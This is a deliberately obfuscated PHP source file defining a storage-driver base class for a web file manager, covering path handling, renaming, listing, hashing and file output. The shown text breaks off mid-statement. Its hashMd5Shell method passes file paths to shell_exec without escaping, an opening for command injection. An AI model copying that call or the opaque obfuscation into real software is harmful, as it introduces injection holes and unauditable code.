<?php
 goto c‚◊äÔœº∂; Cô¢ÀôÇ©¯: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $A‘≠ËÈóéå =& $_SERVER[ú∫]; $this->objectDriver = array($A‘≠ËÈóéå[57], $A‘≠ËÈóéå[58], $A‘≠ËÈóéå[59], $A‘≠ËÈóéå[60], $A‘≠ËÈóéå[61], $A‘≠ËÈóéå[62], $A‘≠ËÈóéå[63], $A‘≠ËÈóéå[64], $A‘≠ËÈóéå[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($a≤Ö›Î‹ÖÌ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($a≤Ö›Î‹ÖÌ, $_SERVER[ú∫][8]); } return $a≤Ö›Î‹ÖÌ; } public function iconvApp($a‘∏¥Ü–®Â) { return $a‘∏¥Ü–®Â; } public function iconvSystem($BåœŸÂã‚Ÿ) { return $BåœŸÂã‚Ÿ; } public function iconvTo($B©œ ëØïÙ, $Céê˜Û›µ†, $Añ¯„ñÜöƒ) { goto d˜∞íÖıﬁÿ; d˜∞íÖıﬁÿ: $dÎÙ‹Œ∂∫Ö =& $_SERVER[ú∫]; if (!$B©œ ëØïÙ || !function_exists($dÎÙ‹Œ∂∫Ö[66])) { return $B©œ ëØïÙ; } static $e°ß ‚‰Ωó = array(); goto a©ëê∂«ÓÎ; DËŸìàª”£: return $dŒ≥∏˜µ¡É; goto B∫íáœµíñ; BÆ˘™è´Òö: $dŒ≥∏˜µ¡É = $dŒ≥∏˜µ¡É ? $dŒ≥∏˜µ¡É : $B©œ ëØïÙ; if (strstr($dŒ≥∏˜µ¡É, $dÎÙ‹Œ∂∫Ö[70])) { $dŒ≥∏˜µ¡É = str_replace($dÎÙ‹Œ∂∫Ö[70], $dÎÙ‹Œ∂∫Ö[71], $dŒ≥∏˜µ¡É); } $e°ß ‚‰Ωó[$Céê˜Û›µ† . $dÎÙ‹Œ∂∫Ö[67] . $Añ¯„ñÜöƒ . $dÎÙ‹Œ∂∫Ö[68] . $B©œ ëØïÙ] = $dŒ≥∏˜µ¡É; goto eÑ´Ì‘¥Ìß; eÑ´Ì‘¥Ìß: $e°ß ‚‰Ωó[$Añ¯„ñÜöƒ . $dÎÙ‹Œ∂∫Ö[67] . $Céê˜Û›µ† . $dÎÙ‹Œ∂∫Ö[68] . $B©œ ëØïÙ] = $B©œ ëØïÙ; $e°ß ‚‰Ωó[$Añ¯„ñÜöƒ . $dÎÙ‹Œ∂∫Ö[67] . $Céê˜Û›µ† . $dÎÙ‹Œ∂∫Ö[68] . $dŒ≥∏˜µ¡É] = $B©œ ëØïÙ; $e°ß ‚‰Ωó[$Céê˜Û›µ† . $dÎÙ‹Œ∂∫Ö[67] . $Añ¯„ñÜöƒ . $dÎÙ‹Œ∂∫Ö[68] . $dŒ≥∏˜µ¡É] = $dŒ≥∏˜µ¡É; goto DËŸìàª”£; a©ëê∂«ÓÎ: $BÀ¥¢àÉ†ò = $Céê˜Û›µ† . $dÎÙ‹Œ∂∫Ö[67] . $Añ¯„ñÜöƒ . $dÎÙ‹Œ∂∫Ö[68] . $B©œ ëØïÙ; if (isset($e°ß ‚‰Ωó[$BÀ¥¢àÉ†ò])) { return $e°ß ‚‰Ωó[$BÀ¥¢àÉ†ò]; } if (function_exists($dÎÙ‹Œ∂∫Ö[69])) { $dŒ≥∏˜µ¡É = @mb_convert_encoding($B©œ ëØïÙ, $Añ¯„ñÜöƒ, $Céê˜Û›µ†); } else { $dŒ≥∏˜µ¡É = @iconv($Céê˜Û›µ†, $Añ¯„ñÜöƒ, $B©œ ëØïÙ); } goto BÆ˘™è´Òö; B∫íáœµíñ: } public function getPathInner($e‘Ò§µ«±ã) { $BØÚﬁ‘Ç‰¡ = IO::init($e‘Ò§µ«±ã); return $BØÚﬁ‘Ç‰¡->path; } public function getPathOuter($aí‰ˆ˘ÜŸ™) { $EçÑ¿™¬ô‡ =& $_SERVER[ú∫]; $d…ã±î¡‹ﬁ = strlen(trim($this->pathBase, $EçÑ¿™¬ô‡[8])); $aí‰ˆ˘ÜŸ™ = substr(trim($aí‰ˆ˘ÜŸ™, $EçÑ¿™¬ô‡[8]), $d…ã±î¡‹ﬁ); return $this->pathDriver . $EçÑ¿™¬ô‡[8] . ltrim($aí‰ˆ˘ÜŸ™, $EçÑ¿™¬ô‡[8]); } public function isParentOf($aÃíè¿à…ñ, $CÇÑˆ∫◊€¶) { $D∞πâ›¨ÌÈ =& $_SERVER[ú∫]; $aÃíè¿à…ñ = rtrim(strtolower($aÃíè¿à…ñ), $D∞πâ›¨ÌÈ[8]) . $D∞πâ›¨ÌÈ[8]; $CÇÑˆ∫◊€¶ = rtrim(strtolower($CÇÑˆ∫◊€¶), $D∞πâ›¨ÌÈ[8]) . $D∞πâ›¨ÌÈ[8]; $FñÁÂÖù¢‹ = strpos($CÇÑˆ∫◊€¶, $aÃíè¿à…ñ) === 0; return $FñÁÂÖù¢‹; } public function getType() { $fôæ√›Ñìñ =& $_SERVER[ú∫]; $CØû‹Ω„√¢ = str_replace($fôæ√›Ñìñ[72], $fôæ√›Ñìñ[33], get_class($this)); return strtolower($CØû‹Ω„√¢); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($f›€íüºƒÖ, $Dãÿó‘»’) { $f¯»¡Êã∑ˆ =& $_SERVER[ú∫]; $Bõî£áÚç… = rtrim($f›€íüºƒÖ, $f¯»¡Êã∑ˆ[8]) . $f¯»¡Êã∑ˆ[8] . $Dãÿó‘»’; $c™ÖŸ∆Üº— = $this->exist($Bõî£áÚç…); return $c™ÖŸ∆Üº— ? $Bõî£áÚç… : !1; } public function setModifyTime($cîÍëûﬂÉ’, $Dì‘¶Áè∂™ = '') { } public function renameObject($dêÖµ◊´æÃ, $CüÍ“’ÁÑö) { goto a®Ûäúé€ã; a®Ûäúé€ã: $b‘Áòﬂè±Ó =& $_SERVER[ú∫]; $AŸÔÁóÁÑ¡ = $CüÍ“’ÁÑö; Hook::trigger($b‘Áòﬂè±Ó[73], $this, $dêÖµ◊´æÃ, $this, $this->pathFather($dêÖµ◊´æÃ) . $CüÍ“’ÁÑö); goto EâÃØâ™≠´; EâÃØâ™≠´: $dêÖµ◊´æÃ = $this->getPathOuter($dêÖµ◊´æÃ); $CüÍ“’ÁÑö = $this->pathFather($dêÖµ◊´æÃ) . $CüÍ“’ÁÑö; if (IO::isFile($dêÖµ◊´æÃ)) { $DÉÇ™öã§» = IO::copy($dêÖµ◊´æÃ, $this->pathFather($dêÖµ◊´æÃ), REPEAT_RENAME_FOLDER, $AŸÔÁóÁÑ¡); if ($DÉÇ™öã§») { IO::remove($dêÖµ◊´æÃ); } } else { $DÉÇ™öã§» = IO::mkdir($CüÍ“’ÁÑö); if (!$DÉÇ™öã§») { return !1; } $C≈§ÚÑ“ï = IO::listPath($dêÖµ◊´æÃ, !0); $e÷ß∞èõ„π = array_merge($C≈§ÚÑ“ï[$b‘Áòﬂè±Ó[74]], $C≈§ÚÑ“ï[$b‘Áòﬂè±Ó[75]]); foreach ($e÷ß∞èõ„π as $dªÑÀÃ´ñﬁ) { IO::move($dªÑÀÃ´ñﬁ[$b‘Áòﬂè±Ó[76]], $CüÍ“’ÁÑö, REPEAT_RENAME_FOLDER); } IO::remove($dêÖµ◊´æÃ); } goto FÛ¬‹È¨≠›; FÛ¬‹È¨≠›: return $DÉÇ™öã§» ? $CüÍ“’ÁÑö : !1; goto B†êºﬂä¬∑; B†êºﬂä¬∑: } public function tempFile($E‰ÈÙë∂Öë = '', $e†ﬂºôÂ®ñ = '') { goto aïÁ“è√æû; aïÁ“è√æû: if (!$E‰ÈÙë∂Öë) { $E‰ÈÙë∂Öë = rand_string(15); } $BÛ†≈¿àú‚ = TEMP_FILES . rand_string(15) . $_SERVER[ú∫][8]; @mkdir($BÛ†≈¿àú‚, 511, !0); goto dîÔ∆Ô‚∑“; fÊ†Í∆Üãç: return $Eå≈Æ‰Ç†¢; goto bâ„å˘ÆäË; dîÔ∆Ô‚∑“: $Eå≈Æ‰Ç†¢ = $BÛ†≈¿àú‚ . $E‰ÈÙë∂Öë; @touch($Eå≈Æ‰Ç†¢); if ($e†ﬂºôÂ®ñ) { file_put_contents($Eå≈Æ‰Ç†¢, $e†ﬂºôÂ®ñ); } goto fÊ†Í∆Üãç; bâ„å˘ÆäË: } public function tempFileRemve($E±†»ïÔªÁ) { @unlink($E±†»ïÔªÁ); @rmdir($this->pathFather($E±†»ïÔªÁ)); } public function mkfile($dŒ‚Âëæ≠Í, $fùÙèü˜ëé = '', $c¨„«ŒãÑ∂ = REPEAT_RENAME) { } public function mkdir($a≥˜ÛÒùıÚ, $B‡ÓíÿÌ¨£ = REPEAT_SKIP) { } public function delFile($eªÜ¢º”Ï€) { } public function delFolder($FÂ£˘Æ´‹å) { } public function copyFile($f¿ÔûÊ€””, $C™±€⁄∏ùƒ) { } public function moveFile($BÀ∞¡∞«Ò , $b√”Ë∫é≠«) { } public function remove($CÕ∫ﬁ·éë®) { if ($this->isFile($CÕ∫ﬁ·éë®)) { return $this->delFile($CÕ∫ﬁ·éë®); } return $this->delFolder($CÕ∫ﬁ·éë®); } public function rename($D≠èÂƒ©åÑ, $c≤Ê—ﬁƒÃò) { } public function exist($f¯é¿£Óçì) { } public function findByHash($e¥≠∑¥°ê≤ = '', $d¥¯Áò’Û = '') { return !1; } public function isFile($Bõíùñã√ä) { } public function isFolder($A√Çë…”æ◊) { } public function size($E†π÷ÑÀº≥) { } public function info($e∏ŒπÜéÜ•) { } public function infoSimple($FÔ∆ÂÒ˘ì∏) { return $this->info($FÔ∆ÂÒ˘ì∏); } public function infoAuth($A…„êß¨Ù±) { return $this->info($A…„êß¨Ù±); } public function infoFull($d©»≤ ¢πÂ) { return $this->info($d©»≤ ¢πÂ); } public function infoWithChildren($AƒÁ¡ä•˘°) { $Fπí—ﬁï≈ß =& $_SERVER[ú∫]; static $C∏°™ÉÉﬂ∂ = array(); if (isset($C∏°™ÉÉﬂ∂[$AƒÁ¡ä•˘°])) { return $C∏°™ÉÉﬂ∂[$AƒÁ¡ä•˘°]; } $Eƒ∑ª¿⁄Îì = $this->info($AƒÁ¡ä•˘°); if ($Eƒ∑ª¿⁄Îì && $Eƒ∑ª¿⁄Îì[$Fπí—ﬁï≈ß[29]] == $Fπí—ﬁï≈ß[77]) { $B¶‘¥‰¡È© = array($Fπí—ﬁï≈ß[78] => 0, $Fπí—ﬁï≈ß[79] => 0, $Fπí—ﬁï≈ß[80] => 0); $this->infoChildren($AƒÁ¡ä•˘°, $B¶‘¥‰¡È©); $Eƒ∑ª¿⁄Îì[$Fπí—ﬁï≈ß[78]] = $B¶‘¥‰¡È©[$Fπí—ﬁï≈ß[78]]; $Eƒ∑ª¿⁄Îì[$Fπí—ﬁï≈ß[81]] = array($Fπí—ﬁï≈ß[82] => $B¶‘¥‰¡È©[$Fπí—ﬁï≈ß[79]], $Fπí—ﬁï≈ß[83] => $B¶‘¥‰¡È©[$Fπí—ﬁï≈ß[80]]); $C∏°™ÉÉﬂ∂[$AƒÁ¡ä•˘°] = $Eƒ∑ª¿⁄Îì; } return $Eƒ∑ª¿⁄Îì; } public function listPath($CÕ πóøƒ…, $e·ü‚¶û»Ω = false) { } public function has($aﬁºö‹∫≤â, $d‘π±≥ãüç = false, $F”ÃŒ‰áè = false) { } public function canRead($cå˜∂ï…÷¬) { } public function canWrite($aÁ†ﬂã¯ÆÉ) { } public function getContent($b≤‘÷·ﬁû§) { } public function setContent($cèåÂÆ≈‰¥, $d¿∏“‰èÙ© = '') { } protected function infoChildren($AÕ ÏÎ›Ì‰, &$BˆïÑã›∏‘) { $fäˆ·Ü‘§ú =& $_SERVER[ú∫]; check_abort_echo(); $D‡ú®≥Éù± = $this->listPath($AÕ ÏÎ›Ì‰, !0); $D‡ú®≥Éù± = array_merge($D‡ú®≥Éù±[$fäˆ·Ü‘§ú[75]], $D‡ú®≥Éù±[$fäˆ·Ü‘§ú[74]]); foreach ($D‡ú®≥Éù± as $FÕ◊ôá›ó–) { if ($FÕ◊ôá›ó–[$fäˆ·Ü‘§ú[29]] == $fäˆ·Ü‘§ú[77]) { $BˆïÑã›∏‘[$fäˆ·Ü‘§ú[80]]++; $Bı† π∑ûä = $this->getPathInner($FÕ◊ôá›ó–[$fäˆ·Ü‘§ú[76]]); $this->infoChildren($Bı† π∑ûä, $BˆïÑã›∏‘); } else { $BˆïÑã›∏‘[$fäˆ·Ü‘§ú[79]]++; $BˆïÑã›∏‘[$fäˆ·Ü‘§ú[78]] += $FÕ◊ôá›ó–[$fäˆ·Ü‘§ú[78]]; } } } public function fileSubstr($Bˆ‚Æ˘®†™, $dìËΩ’≥á®, $CáêŸà¥ÉÎ) { } public function listAll($fØàÒåêÜ≥) { } public function listAllMake($C–›Éù·ê∞, &$F‰·÷ÂâŒË) { $fËÂÜ≈ƒπö =& $_SERVER[ú∫]; check_abort_echo(); $aﬁŸ∏©æß´ = $this->listPath($C–›Éù·ê∞, !0); if (!$aﬁŸ∏©æß´) { return; } $d€∏âçö∑© = array_merge($aﬁŸ∏©æß´[$fËÂÜ≈ƒπö[75]], $aﬁŸ∏©æß´[$fËÂÜ≈ƒπö[74]]); foreach ($d€∏âçö∑© as $Aåß≤Œﬁ∆Õ) { goto cÓ”ìµ∂π∂; cÓ”ìµ∂π∂: $dí≈Ú¶¢ﬁ∫ = $Aåß≤Œﬁ∆Õ[$fËÂÜ≈ƒπö[29]] == $fËÂÜ≈ƒπö[77]; $eàÍà∂¯¯Ñ = array($fËÂÜ≈ƒπö[76] => $Aåß≤Œﬁ∆Õ[$fËÂÜ≈ƒπö[76]], $fËÂÜ≈ƒπö[77] => $dí≈Ú¶¢ﬁ∫); if (isset($Aåß≤Œﬁ∆Õ[$fËÂÜ≈ƒπö[78]])) { $eàÍà∂¯¯Ñ[$fËÂÜ≈ƒπö[78]] = $Aåß≤Œﬁ∆Õ[$fËÂÜ≈ƒπö[78]]; } goto f£†æ€Üó; cî€àƒ›ﬁ—: $this->listAllMake($Aåß≤Œﬁ∆Õ[$fËÂÜ≈ƒπö[76]], $F‰·÷ÂâŒË); goto B ˆŒ◊ÈÌ∞; f£†æ€Üó: if (isset($Aåß≤Œﬁ∆Õ[$fËÂÜ≈ƒπö[84]])) { $eàÍà∂¯¯Ñ[$fËÂÜ≈ƒπö[84]] = $Aåß≤Œﬁ∆Õ[$fËÂÜ≈ƒπö[84]]; } if (!$dí≈Ú¶¢ﬁ∫) { $F‰·÷ÂâŒË[] = $eàÍà∂¯¯Ñ; continue; } $F‰·÷ÂâŒË[] = $eàÍà∂¯¯Ñ; goto cî€àƒ›ﬁ—; B ˆŒ◊ÈÌ∞: } } public function listAllSimple($bçµ’®µÃç) { $E™‰πâ≈Öõ =& $_SERVER[ú∫]; $DßË’ô√µ¥ = array(); $Cäé§´÷≈˘ = $this->listAll($bçµ’®µÃç); $CÚîëõäÆπ = $this->getPathOuter($bçµ’®µÃç); foreach ($Cäé§´÷≈˘ as $E∫ºèëµÉå) { goto b≤ø‚¥áÃ; a¬»≠Û÷Ú: if (!$E∫ºèëµÉå[$E™‰πâ≈Öõ[77]]) { $aï«œÁ–Îò[$E™‰πâ≈Öõ[86]] = $Eµ¶üÔ‰´; } $DßË’ô√µ¥[] = $aï«œÁ–Îò; goto D§àáöÈ‹›; eï„ù˜¿ÓÂ: $aï«œÁ–Îò = array($E™‰πâ≈Öõ[76] => $aÆ◊Úïµ™ä, $E™‰πâ≈Öõ[77] => $E∫ºèëµÉå[$E™‰πâ≈Öõ[77]]); if (isset($E∫ºèëµÉå[$E™‰πâ≈Öõ[78]]) && !$E∫ºèëµÉå[$E™‰πâ≈Öõ[77]]) { $aï«œÁ–Îò[$E™‰πâ≈Öõ[78]] = $E∫ºèëµÉå[$E™‰πâ≈Öõ[78]]; } if (isset($E∫ºèëµÉå[$E™‰πâ≈Öõ[84]])) { $aï«œÁ–Îò[$E™‰πâ≈Öõ[84]] = $E∫ºèëµÉå[$E™‰πâ≈Öõ[84]]; } goto a¬»≠Û÷Ú; b≤ø‚¥áÃ: $Eµ¶üÔ‰´ = $E∫ºèëµÉå[$E™‰πâ≈Öõ[76]]; $aÆ◊Úïµ™ä = $E∫ºèëµÉå[$E™‰πâ≈Öõ[76]]; if (isset($E∫ºèëµÉå[$E™‰πâ≈Öõ[85]])) { $Eµ¶üÔ‰´ = $E∫ºèëµÉå[$E™‰πâ≈Öõ[85]][$E™‰πâ≈Öõ[76]]; $E∫ºèëµÉå[$E™‰πâ≈Öõ[78]] = $E∫ºèëµÉå[$E™‰πâ≈Öõ[85]][$E™‰πâ≈Öõ[78]]; $E∫ºèëµÉå[$E™‰πâ≈Öõ[84]] = $E∫ºèëµÉå[$E™‰πâ≈Öõ[85]][$E™‰πâ≈Öõ[84]]; } else { $aÆ◊Úïµ™ä = substr($E∫ºèëµÉå[$E™‰πâ≈Öõ[76]], strlen(get_path_father($CÚîëõäÆπ))); $aÆ◊Úïµ™ä = $E™‰πâ≈Öõ[8] . ltrim($aÆ◊Úïµ™ä, $E™‰πâ≈Öõ[8]); } goto eï„ù˜¿ÓÂ; D§àáöÈ‹›: } return $DßË’ô√µ¥; } public function upload($c›Ë™Ìæ◊∂, $EçÃõ≥„“‘, $c§¿ª¥°ºä = false, $DÔΩ‚“”Ö = REPEAT_REPLACE) { } public function uploadFileByID($fÀıÀÕï„¶, $D≠õ‰÷™≥ä, $E¨°õ“´¢µ) { } public function uploadFileByPath($Aòã∏±Ò±÷, $D»Ø››íØË, $DïÇÿ¿ΩÒæ = array()) { } public function isUploadServer() { $dÖ¨‚†Ïßô =& $_SERVER[ú∫]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $dÖ¨‚†Ïßô[87]) { return !0; } return $GLOBALS[$dÖ¨‚†Ïßô[6]][$dÖ¨‚†Ïßô[88]][$dÖ¨‚†Ïßô[89]]; } public function isFileOutServer() { $cí≠ﬁ≈Á» =& $_SERVER[ú∫]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $cí≠ﬁ≈Á»[87]) { return !0; } return $GLOBALS[$cí≠ﬁ≈Á»[6]][$cí≠ﬁ≈Á»[88]][$cí≠ﬁ≈Á»[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($B”ê√œΩïñ) { $d˜¶À™‹›ﬂ =& $_SERVER[ú∫]; if (!$this->isCdnHost()) { return $B”ê√œΩïñ; } return str_replace(trim(get_url_root($B”ê√œΩïñ), $d˜¶À™‹›ﬂ[8]), trim($this->cdnHost, $d˜¶À™‹›ﬂ[8]), $B”ê√œΩïñ); } public function uploadLink($eËåƒèßˆè, $bÈéêÊ§È˜ = 0) { goto aﬁıÚ¿å±Ë; C‚ïÌúÀ¯ﬂ: if (!in_array($B»ÚÚ†œè‚, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Cõ∞•Ê∞Ù÷ = 1024 * 1024 * 10; goto F—∫ç–£¿∞; dùÈ‘€ïüã: if ($EÍËØÉœ∆á) { $EÍËØÉœ∆á[$cß€ÏıçËø[93]] = $eËåƒèßˆè; $EÍËØÉœ∆á[$cß€ÏıçËø[94]] = $B»ÚÚ†œè‚; } return $EÍËØÉœ∆á; goto EÏ ˆã‘¨ä; aﬁıÚ¿å±Ë: $cß€ÏıçËø =& $_SERVER[ú∫]; if ($this->isUploadServer()) { return; } $B»ÚÚ†œè‚ = $this->getType(); goto C‚ïÌúÀ¯ﬂ; F—∫ç–£¿∞: $FâäÔªÍÁí = $bÈéêÊ§È˜ <= $Cõ∞•Ê∞Ù÷ ? $cß€ÏıçËø[91] : $cß€ÏıçËø[92]; $Aµ‰ØﬂÔ÷∑ = (!$bÈéêÊ§È˜ ? 1 : ceil($bÈéêÊ§È˜ / pow(1024, 3))) * 3600 * 4; $EÍËØÉœ∆á = $this->{$FâäÔªÍÁí}($eËåƒèßˆè, $Aµ‰ØﬂÔ÷∑); goto dùÈ‘€ïüã; EÏ ˆã‘¨ä: } public function uploadFormData($b”è»Ì€äº, $eíø£°ÚàŒ = 3600) { } public function multiUploadFormData($cÛª⁄√âœŸ, $Fﬂ±¶ñ˜úÔ = 3600) { } public function download($c‰¢«‚åú∞, $cµÓØ†Û„¨) { } public function ext($b…±†Öú‹ò) { $d—»∑ﬁ÷êŒ =& $_SERVER[ú∫]; if (strpos($b…±†Öú‹ò, $d—»∑ﬁ÷êŒ[8]) === -1) { $FãøÔ∆√ÈÀ = $b…±†Öú‹ò; } else { $FãøÔ∆√ÈÀ = $this->pathThis($b…±†Öú‹ò); } $a™ î•Ëßé = $d—»∑ﬁ÷êŒ[33]; if (strstr($FãøÔ∆√ÈÀ, $d—»∑ﬁ÷êŒ[95])) { $a™ î•Ëßé = substr($FãøÔ∆√ÈÀ, strrpos($FãøÔ∆√ÈÀ, $d—»∑ﬁ÷êŒ[95]) + 1); $a™ î•Ëßé = strtolower($a™ î•Ëßé); } if (strlen($a™ î•Ëßé) > 3 && preg_match($d—»∑ﬁ÷êŒ[96], $a™ î•Ëßé, $eä«ù∑ââå)) { $a™ î•Ëßé = $d—»∑ﬁ÷êŒ[33]; } return $a™ î•Ëßé; } public function pathThis($cèã°Î„Ñ) { $aÑÈÀ≥“Ãƒ =& $_SERVER[ú∫]; $cèã°Î„Ñ = str_replace($aÑÈÀ≥“Ãƒ[97], $aÑÈÀ≥“Ãƒ[8], rtrim($cèã°Î„Ñ, $aÑÈÀ≥“Ãƒ[8])); $eπ˜÷Ê‘´⁄ = strrpos($cèã°Î„Ñ, $aÑÈÀ≥“Ãƒ[8]); if ($eπ˜÷Ê‘´⁄ === !1) { return $cèã°Î„Ñ; } return substr($cèã°Î„Ñ, $eπ˜÷Ê‘´⁄ + 1); } public function pathFather($bœ«©¨úúÖ) { $F⁄ﬁ÷›ì˜ =& $_SERVER[ú∫]; $bœ«©¨úúÖ = str_replace($F⁄ﬁ÷›ì˜[97], $F⁄ﬁ÷›ì˜[8], rtrim($bœ«©¨úúÖ, $F⁄ﬁ÷›ì˜[8])); $eÔ™©ΩÉÿ– = strrpos($bœ«©¨úúÖ, $F⁄ﬁ÷›ì˜[8]); if ($eÔ™©ΩÉÿ– === !1) { return $F⁄ﬁ÷›ì˜[33]; } return substr($bœ«©¨úúÖ, 0, $eÔ™©ΩÉÿ– + 1); } public function hashSimple($B∂ƒÔê·ÍÁ) { goto c±ÛÛàπ◊É; E¥õÇÕÌçÑ: $eËˆô©ú„∂ = intval($FÇ∆»ëÁéÑ / $DÙêÑ™äˆ¿); $aÖ¯Çœíê† = $C≈Ñå±ÓÉ¿[33]; for ($e÷Íìåïç± = 0; $e÷Íìåïç± < $DÙêÑ™äˆ¿; $e÷Íìåïç±++) { $aÖ¯Çœíê† .= $this->fileSubstr($B∂ƒÔê·ÍÁ, $eËˆô©ú„∂ * $e÷Íìåïç±, $fÖø¥À÷‚ƒ); } goto b‘Í‹âø≤’; BÕÔÑ©Ë÷¥: $fÖø¥À÷‚ƒ = 200; $DÙêÑ™äˆ¿ = 50; if ($FÇ∆»ëÁéÑ <= $fÖø¥À÷‚ƒ * $DÙêÑ™äˆ¿) { return $this->hashMd5($B∂ƒÔê·ÍÁ) . $FÇ∆»ëÁéÑ; } goto E¥õÇÕÌçÑ; b‘Í‹âø≤’: $aÖ¯Çœíê† .= $this->fileSubstr($B∂ƒÔê·ÍÁ, $FÇ∆»ëÁéÑ - $fÖø¥À÷‚ƒ, $fÖø¥À÷‚ƒ); return md5($aÖ¯Çœíê†) . $FÇ∆»ëÁéÑ; goto eù≤Á«“„ú; c±ÛÛàπ◊É: $C≈Ñå±ÓÉ¿ =& $_SERVER[ú∫]; if (!$B∂ƒÔê·ÍÁ) { return md5($C≈Ñå±ÓÉ¿[33]); } $FÇ∆»ëÁéÑ = $this->size($B∂ƒÔê·ÍÁ); goto BÕÔÑ©Ë÷¥; eù≤Á«“„ú: } public static $md5Cache = array(); public function hashMd5($A¨å∑ìãªœ) { $A¨å∑ìãªœ = $this->iconvSystem($A¨å∑ìãªœ); if (isset(self::$md5Cache[$A¨å∑ìãªœ])) { return self::$md5Cache[$A¨å∑ìãªœ]; } self::$md5Cache[$A¨å∑ìãªœ] = $this->hashMd5Shell($A¨å∑ìãªœ); if (!self::$md5Cache[$A¨å∑ìãªœ]) { self::$md5Cache[$A¨å∑ìãªœ] = @md5_file($A¨å∑ìãªœ); } return self::$md5Cache[$A¨å∑ìãªœ]; } private function hashMd5Shell($dì‰†≥°ïœ) { goto aù≈è¿®Í…; D∫‚û©¡±”: $b’ÕñªêÎŒ = Cache::get($Bˆ»Ù›ÀÖﬁ[101]); if (!$b’ÕñªêÎŒ) { $aëÜÉ¢Â‹ä = BASIC_PATH . $Bˆ»Ù›ÀÖﬁ[102]; $b÷™Êç¥Ó¥ = md5_file($aëÜÉ¢Â‹ä); $b’ÕñªêÎŒ = $Bˆ»Ù›ÀÖﬁ[103]; foreach ($eú¬°˜é¥Ü as $aﬂëøû∆–) { $c‘”ó®¬…∆ = shell_exec($aﬂëøû∆– . "\x20\42{$aëÜÉ¢Â‹ä}\42"); if ($c‘”ó®¬…∆ && substr(trim($c‘”ó®¬…∆), 0, 32) == $b÷™Êç¥Ó¥) { $b’ÕñªêÎŒ = $aﬂëøû∆–; break; } } Cache::set($Bˆ»Ù›ÀÖﬁ[101], $b’ÕñªêÎŒ, 3600); } if ($b’ÕñªêÎŒ == $Bˆ»Ù›ÀÖﬁ[103]) { return !1; } goto EÂÏüÛıóƒ; aù≈è¿®Í…: $Bˆ»Ù›ÀÖﬁ =& $_SERVER[ú∫]; if (!function_exists($Bˆ»Ù›ÀÖﬁ[98])) { return !1; } $eú¬°˜é¥Ü = array($Bˆ»Ù›ÀÖﬁ[99], $Bˆ»Ù›ÀÖﬁ[100]); goto D∫‚û©¡±”; EÂÏüÛıóƒ: $c‘”ó®¬…∆ = shell_exec($b’ÕñªêÎŒ . "\x20\x22{$dì‰†≥°ïœ}\x22"); $c‘”ó®¬…∆ = str_replace($Bˆ»Ù›ÀÖﬁ[104], $Bˆ»Ù›ÀÖﬁ[33], $c‘”ó®¬…∆); return substr($c‘”ó®¬…∆, 0, 32); goto d◊ﬂƒÂçàÉ; d◊ﬂƒÂçàÉ: } public function link($b¢œÇìèÉÛ) { return $b¢œÇìèÉÛ; } public function fileOut($BÔ«∂íö, $F‹≠øé’ßù = false, $c‚”Ò¥ƒ¡Ô = false, $D®€ıº±àÜ = '') { goto BÑ∞Ü‘úêè; b—„íœÎ–ﬂ: if ($fòÚœ≤°Ö¬) { $bµ¥»°∆äƒ = intval(1000 * 1000 * ($fÉïÓ¶ïÏ˜ / $fòÚœ≤°Ö¬)); } while ($c≈Â˜åˆê∆ <= $Dñúòø¶Ø´) { $D·Ò∂ÁÍä¶ = timeFloat(); check_abort(); $eﬁë°îÀéπ = $Dñúòø¶Ø´ - $c≈Â˜åˆê∆ + 1; if ($eﬁë°îÀéπ <= $fÉïÓ¶ïÏ˜) { $fÉïÓ¶ïÏ˜ = $eﬁë°îÀéπ; } echo $this->fileSubstr($BÔ«∂íö, $c≈Â˜åˆê∆, $fÉïÓ¶ïÏ˜); $c≈Â˜åˆê∆ += $fÉïÓ¶ïÏ˜; if ($fÉïÓ¶ïÏ˜ == $eﬁë°îÀéπ) { $c≈Â˜åˆê∆ = $Dñúòø¶Ø´ + 1; } if ($bµ¥»°∆äƒ) { $dã¥ÚÈœºı = intval(1000 * 1000 * (timeFloat() - $D·Ò∂ÁÍä¶)); $fÿÖﬂ—Ò»› = $bµ¥»°∆äƒ - $dã¥ÚÈœºı; if ($fÿÖﬂ—Ò»› > 5) { usleep($fÿÖﬂ—Ò»›); } } } goto B¬ †‹ΩŸı; F–Ë‰ù©õ·: $AﬁÁ¡Íï¢¯ = $bÈÔ” »œè[$e◊åèßÿ∞‹[78]]; $fùñ¶†ò—√ = gmdate($e◊åèßÿ∞‹[110], $bÈÔ” »œè[$e◊åèßÿ∞‹[84]]); $eó™°Ø∆◊  = $c‚”Ò¥ƒ¡Ô ? $c‚”Ò¥ƒ¡Ô : $this->iconvApp($bÈÔ” »œè[$e◊åèßÿ∞‹[28]]); goto D”ÜìßÉ Ã; aÖ ÆÖâèè: $b¡Ùöú¡ú´ = get_file_mime($b¨ë‰∞≤´û); if (strstr($b¡Ùöú¡ú´, $e◊åèßÿ∞‹[117])) { $b¡Ùöú¡ú´ = $b¡Ùöú¡ú´ . $e◊åèßÿ∞‹[118]; } if ($F‹≠øé’ßù === !1 && !mime_support($b¡Ùöú¡ú´)) { $F‹≠øé’ßù = !0; $b¡Ùöú¡ú´ = $e◊åèßÿ∞‹[119]; } goto c⁄ÖÚÙ¥ﬂâ; fÕÇ≠¢ÏÛÙ: $AÏ ˘Œñú± = $e◊åèßÿ∞‹[116] . $AÏ ˘Œñú± . $e◊åèßÿ∞‹[122] . $AÏ ˘Œñú±; if ($F‹≠øé’ßù) { header($e◊åèßÿ∞‹[123]); header($e◊åèßÿ∞‹[124] . $AÏ ˘Œñú±); } else { header($e◊åèßÿ∞‹[125] . $AÏ ˘Œñú±); } header($e◊åèßÿ∞‹[126] . gmdate($e◊åèßÿ∞‹[110], time() + 3600 * 24 * 30) . $e◊åèßÿ∞‹[127]); goto fª®û¡Ω∂è; A∫èÎÑ¯ÍË: $A•—°ƒ··ü = $this->getType() == $e◊åèßÿ∞‹[106]; $Dﬂ›Ü¡ÂÑâ = 